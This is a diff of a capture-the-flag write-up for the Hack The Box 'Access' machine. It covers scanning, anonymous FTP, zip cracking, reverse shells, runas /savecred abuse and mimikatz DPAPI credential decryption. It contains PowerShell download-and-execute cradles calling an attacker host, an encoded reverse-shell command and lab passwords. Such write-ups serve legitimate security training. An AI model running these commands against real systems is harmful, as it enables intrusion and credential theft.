@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+```
 nmap -sV -sC -vv 10.10.10.98
 nmap-sU -vv --top-ports=40 10.10.98
 
@@ -54,12 +54,12 @@ PORT      STATE         SERVICE         REASON
 593/udp   open|filtered http-rpc-epmap  no-response
 ....
 ```
-	- All udp ports are open
-		- This is probably because in windows it doesnt send back an ICMP message so we don't know if its actually open or not hence nmap shows "open|filtered"
-	- TCP :
-		- FTP
-		- Telnet
-		- Http
+- All udp ports are open
+	- This is probably because in windows it doesnt send back an ICMP message so we don't know if its actually open or not hence nmap shows "open|filtered"
+- TCP :
+	- FTP
+	- Telnet
+	- Http
 ## Website Enumeration
 
 ### Direct
@@ -68,15 +68,15 @@ PORT      STATE         SERVICE         REASON
 
 ## Directory Enumeration
 - gobuster :
-```bash
+```
 gobuster dir -u http://10.10.10.98 dns --wordlist /usr/share/wordlists/dirb/big.txt -o gobuster.root
 
 ---OUTPUT---
 http://10.10.10.98/aspnet_client/
 ```
-	- Access denied
+- Access denied
 - ftp:
-```bash
+```
 ftp 10.10.10.98
 > anonymous : <no_pwd>/anonymous
 > dir
@@ -104,22 +104,22 @@ File may not have transferred correctly.
 ```
 - the error lead to the mdb table being unable to be read.
 	- to fix :
-```bash
+```
 > type binary # Then get files
 --OR--
 use wget command
 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
 ```
 - When trying to unzip the zip file we get:
-```bash
+```
 unzip Access\ Control.zip
 
 ---OUTPUT---
 skipping: Access Control.pst      unsupported compression method 99
 ```
-	- This implies it is password protected
+- This implies it is password protected
 - When doing files command:
-```bash
+```
 files Access\ Control.zip
 
 ---OUTPUT---
@@ -127,7 +127,7 @@ Access Control.zip: Zip archive data, at least v2.0 to extract, compression meth
 ```
 	- it is AES Encrypted
 - Using 7zip
-```bash
+```
 7z x Access\ Control.zip
 
 ---OUTPUT---
@@ -153,12 +153,12 @@ Enter password (will not be echoed):
 		- When we do strings command we see some information related to a DB so it may be unencrypted data
 		- We remove the unnecessary characters by specifying minimum string length, and sort it using the unique argument.
 		- Then we extract the text to use as a wordlist (could not do this but bruteforce might take longer)
-```bash
+```
 cd Backups/
 strings -n 8 backup.mdb | sort -u > wordlist
 ```
 		- We go back to the Access\ Control.zip folder and use zip2john to try and extract hashed password data from the zip file:
-```bash
+```
 cd ../Engineer/
 zip2john Access\ Control.zip > Access\ Control.hash
 mv ../Backup/wordlist .
@@ -168,9 +168,9 @@ john Access\ Control.hash --wordlist=wordlist
 # Note if you've already cracked it, you can find it in the ~/.john/john.pot file
 access4u@security (Access Control.zip/Access Control.pst)
 ```
-	- **Using mdbtools (NEW TOOL)**
-		- We can use mdbtools (install via apt) to read this file.
-```bash
+**Using mdbtools (NEW TOOL)**
+- We can use mdbtools (install via apt) to read this file.
+```
 mdb-sql backup.mdb
 > show tables
 > go
@@ -187,7 +187,7 @@ id,username,password,Status,last_login,RoleID,Remark
 28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
 ```
 			- Or we can extract all tables and then check the contents of auth user
-```bash
+```
 mkdir tables
 for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i; done > tables/$i
 cat tables/auth_user
@@ -201,7 +201,7 @@ id,username,password,Status,last_login,RoleID,Remark
 ## Initial Foothold
 - Unzip the file with the password and get a pst file
 	- We can read it via pst-utils (apt install it) which converts it to a readable mbox format:
-```bash
+```
 readpst Access\ Control.pst
 cat Access\ Control.mbox
 
@@ -214,14 +214,14 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 	- password : 4Cc3ssC0ntr0ller
 - Need better shell:
 	- Check if powershell is working :
-```bash
+```
 powershell whoami
 
 ---On-local-machine---
 access\security
 ```
 	- Use Powershell reverse tcp by nishang
-```bash
+```
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 nishangtcppowershell.ps1
 python3 -m http.server 8001 # on directory where exploit is
 ALSO
@@ -232,7 +232,7 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001
 		- We should get reverse tcp powershell on listener.
 ## Privilege Escalation
 - cmdkey /list (initial enumeration):
-```bash
+```
 cmdkey /list
 
 ---OUTPUT---
@@ -244,7 +244,7 @@ Currently stored credentials:
 ```
 	- We are access so we can try to decrypt this (alternate path)
 - Looking around we find a file in Public/Desktop
-```bash
+```
 cd C:\Users\Public\Desktop
 dir
 
@@ -252,7 +252,7 @@ dir
 ```
 	- link file
 	- Get it's content:
-```bash
+```
 get-Content "ZKAccess3.5 Security System.lnk"
 
 ---OUTPUT---
@@ -261,20 +261,20 @@ runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\W
 	- runs runas.exe
 	- does a savecred : ACCESS\Administrator /savecred
 	- We try to execute a reverse shell:
-```bash
+```
 runas /user:ACCESS\Administrator /savecred "powershell \IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/9998.ps1')"
 ```
 		- It didn't work
 			- Windows processes everything in UTF-16LE, base64
 - Convert to base64 for windows:
-```bash
+```
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/9998.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
 
 ---OUTPUT---
 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwA5ADkAOQA4AC4AcABzADEAJwApAA==
 ```
 - Pass the command with netcat listening:
-```bash
+```
 runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwA5ADkAOQA4AC4AcABzADEAJwApAA=="
 ```
 	- We gain Admin access
@@ -283,7 +283,7 @@ runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAK
 	- `At a high level, for the user scenario, a user’s password is used to derive a user-specific “master key”. These keys are located at C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>, where <SID> is the user’s security identifier and the GUID is the name of the master key. A user can have multiple master keys. This master key needs to be decrypted using the user’s password OR the domain backup key (see Chrome, scenario 4) and is then used to decrypt any DPAPI data blobs.`
 	- Credentials in : `\AppData\Local\Microsoft\Credentials\`
 - Download mimiketz (https://github.com/gentilkiwi/mimikatz/releases):
-```bash
+```
 PS> (New-Object Net.WebClient).DownloadFile('http://10.10.14.25:8001/mimikatz.exe','mimikatz.exe')
 .\mimikatz.exe
 
@@ -298,7 +298,7 @@ PS C:\Users\security\Desktop> Invoke-PowerShellTcp : Program 'mimikatz.exe' fail
 	- This runas credential (and many other types of stored credentials) can be extracted from the Windows Data Protection API. In order to achieve this, it is necessary to identify the credential files and masterkeys. 
 		- Credential filenames are a string of 32 characters, e.g. "85E671988F9A2D1981A4B6791F9A4EE8" while masterkeys are a GUID, e.g. "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2". 
 		- They have the "System files" attribute, and so "DIR /AS" must be used. The following "one-liner" will identify the available credential files and masterkeys:
-```bash
+```
 cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS
 
 ---OUTPUT---
@@ -325,7 +325,7 @@ Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials
 08/22/2018  10:18 PM                24 Preferred
                2 File(s)            492 bytes
 ```
-	![[Pasted image 20250409064834.png]]
+	![Pasted image 20250409064834.png](../Attachments/Pasted%20image%2020250409064834.png)
 	- **Powershell Base64 file transfer**
 		- The credential and masterkey are base64 encoded.
 ```powershell
@@ -350,7 +350,7 @@ AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0A
 			- Command 1 : we get the key which is added to the mimikatz cache
 			- Command 2 : we can then read the credentials
 			- Command 3 : This is what happens if we try to read credentials with password as input (Error)
-```bash
+```
 vi masterkey.b64 # Copy Output 1 above
 vi credentials.b64 # Copy output 2
 cat masterkey.b64 | base64 -d > masterkey
@@ -483,7 +483,7 @@ ERROR kull_m_dpapi_unprotect_blob ; CryptDecrypt (0x80090005)
 - We telnet to machine with the following credentials for admin access:
 	- Username : administrator
 	- Password : 55Acc3ssS3cur1ty@megacorp
-```bash
+```
 telnet 10.10.10.98
 > login : administrator
 > password : 55Acc3ssS3cur1ty@megacorp
@@ -498,22 +498,22 @@ telnet 10.10.10.98
 	- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
 ## JAWS enumeration
 - Can grab jaws-enum and execute to find some files
-```bash
+```
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/jaws-enum.ps1')
 ```
 ### If mimikatz was executable at target
 - The credential file is examined, which reveals the corresponding masterkey (guidMasterKey). This matches the masterkey that was extracted. 
-```bash
+```
 dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
 ```
 - The masterkey file is examined next, and the key is extracted.
-```bash
+```
 dpapi::masterkey /in:0792c32e-48a5-4fe3-8b43-d93d64590580
 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
 ```
 - With the masterkey in mimikatz’s cache, the credential blob can now be decrypted. It is now possible to open a telnet session as ACCESS\Administrator and gain the root flag.
-```bash
+```
 dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
 ```
 
